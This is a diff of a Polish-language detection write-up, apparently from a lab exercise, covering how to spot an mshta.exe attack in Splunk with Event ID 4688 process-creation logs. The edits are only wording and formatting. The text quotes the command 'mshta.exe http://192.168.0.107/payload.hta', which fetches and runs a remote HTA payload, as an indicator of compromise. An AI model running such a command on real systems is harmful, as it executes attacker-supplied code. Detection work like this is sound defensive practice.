@@ -54,10 +54,10 @@ mshta.exe http://192.168.0.107/payload.hta
 
 ## 4. Analiza logów (Splunk / Windows Security)
 
-Do wykrycia tego ataku w Splunk Enterprise wykorzystano zdarzenia tworzenia procesów z włączonym pełnym audytem linii komend (Windows Security Event ID 4688).
+Do wykrycia tego ataku w Splunk Enterprise wykorzystałem zdarzenia tworzenia procesów z włączonym pełnym audytem linii komend (Windows Security Event ID 4688).
 
 Na co patrzeć w strumieniu JSON w Splunk:
 -Event ID 4688 (Process Creation):
--```Nazwa nowego procesu```: Wskazuje na ```C:\Windows\System32\mshta.exe.```
--```Wiersz polecenia``` (CommandLine): Zawiera adres URL ```mshta.exe http://192.168.0.107/payload.hta```, co stanowi silny wskaźnik IOC (Indicator of Compromise).
--```Nazwa procesu twórcy``` (ParentProcessName): Proces nadrzędny to ```cmd.exe```.
+*```Nazwa nowego procesu```: Wskazuje na ```C:\Windows\System32\mshta.exe.```
+*```Wiersz polecenia``` (CommandLine): Zawiera adres URL ```mshta.exe http://192.168.0.107/payload.hta```, co stanowi silny wskaźnik IOC (Indicator of Compromise).
+*```Nazwa procesu twórcy``` (ParentProcessName): Proces nadrzędny to ```cmd.exe```.
